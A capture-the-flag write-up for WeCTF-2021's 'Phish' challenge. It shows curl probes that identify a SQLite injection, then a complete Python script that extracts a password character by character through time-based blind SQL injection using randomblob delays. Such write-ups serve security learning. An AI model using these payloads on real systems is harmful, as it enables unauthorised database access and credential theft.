# WeCTF-2021

<h1>Phish</h1>

From the start testing - ```curl http://phish.sf.ctf.so/add --data"username=test&password=test2'``` will returns an SQL error which means it's vulnerible to SQLi.

Testing ```curl http://phish.sf.ctf.so/add --data "username=' UNION SELECT 1,2 #&password=test2"``` returns ```unrecognized token: "#"```

The database is not MySQL so let's run an SQL query to try to find what DB it is.

With MySQL the page should load in 5 seconds.. `' UNION SELECT 1,IF(LENGTH(password))>0,SLEEP(5),'true') FROM user` -- Instead it returns `no such function: IF`

This error is unique to SQLite. So now we know we need to convert to a SQLite query.

This query should will load in 4-5 seconds if password length is > 0. `curl http://phish.sf.ctf.so/add --data "username=shou&password=', '') UNION SELECT 1,CASE WHEN LENGTH(password)>0 THEN randomblob(500000000) END FROM user WHERE username = 'shou'--"`

It's a successful query and loads in  ~4 seconds. So I wrote a program (included below) to extract all 64 characters of the flag. 

```
import requests

FLAG = []
INJECTION_STRING = "', '') UNION SELECT 1,CASE WHEN unicode(substr(password, {}, {})){}{} THEN randomblob(500000000) END FROM user WHERE username = 'shou'--"

def guess_exact(offset, starting_ascii):
    global FLAG
    global INJECTION_STRING
    for current_ascii in range(starting_ascii-10, starting_ascii):
        print(f'Testing {chr(current_ascii)}')
        POST_DATA = {"password": INJECTION_STRING.format(offset,offset,'=',current_ascii), "username": "shou"}
        load_time = requests.post("http://phish.sf.ctf.so/add", data=POST_DATA).elapsed.total_seconds()
        print(f'Load time: {load_time}')
        if(load_time > 3):
            FLAG.insert(offset, chr(current_ascii))
            break
            
def guess_letter_range(offset):
        global INJECTION_STRING
        for current_ascii in range(30,131):
            if current_ascii % 10 == 0:
                POST_DATA = {"password": INJECTION_STRING.format(offset,offset,'<',current_ascii), "username": "shou"}
                print(f'Testing letters between {chr(current_ascii-10)}-{chr(current_ascii)}')
                load_time = requests.post("http://phish.sf.ctf.so/add", data=POST_DATA).elapsed.total_seconds()
                print(f'Load time: {load_time}')
                if load_time > 3:
                    print(f'Searching exact letter between {chr(current_ascii-10)}-{chr(current_ascii)}')
                    guess_exact(offset, current_ascii)
                    break

for offset in range(1, 64): # 64 is the size of the flag - based from manual testing 
    guess_letter_range(offset)
    print("".join(FLAG))
```
